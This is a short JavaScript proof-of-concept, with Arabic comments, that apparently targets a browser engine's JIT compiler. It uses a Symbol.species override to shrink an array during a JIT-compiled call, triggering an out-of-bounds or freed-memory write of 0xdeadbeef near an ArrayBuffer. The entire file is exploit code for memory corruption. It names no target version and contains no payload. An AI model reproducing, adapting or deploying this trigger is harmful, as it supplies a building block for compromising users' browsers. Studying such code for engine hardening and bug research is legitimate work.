let Trigger = false;
let Arr = null;
let ab = new ArrayBuffer(0x1000);
let y = new Uint32Array(ab);

function Target(Special, Idx, Value) {
    Arr[Idx] = 0x41414141; // كتابة قيمة أولية
    Special.slice(); // يحفز الـ JIT
    Arr[Idx] = Value; // كتابة القيمة النهائية
    y[0] = Arr[Idx]; // محاولة كتابة في ArrayBuffer
    //alert('Target called, Arr[' + Idx + '] = ' + Arr[Idx].toString(16) + ', y[0] = ' + y[0].toString(16));
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if (Trigger) {
                Arr.length = 0; // تعديل الطول
                alert('Length set to 0 by Symbol.species, Arr.length = ' + Arr.length);
                let temp = new Array(2000000).fill(0); // زيادة الحجم لتحرير الذاكرة
            }
        };
    }
};

function main() {
    const Snowflake = new SoSpecial();
    Arr = new Array(0x21); // مصفوفة بحجم 33
    Arr.fill(0);
    for (let Idx = 0; Idx < 0x800; Idx++) { // زيادة التكرارات
        Target(Snowflake, 0, Idx);
    }
    Trigger = true;
    Target(Snowflake, 0x20, 0xdeadbeef); // قيمة جديدة
    alert('Final Arr[0x20] = ' + Arr[0x20].toString(16));
    alert('y[0] = ' + y[0].toString(16)); // مراقبة ArrayBuffer
    alert('Arr.length = ' + Arr.length); // الطول النهائي
}

main();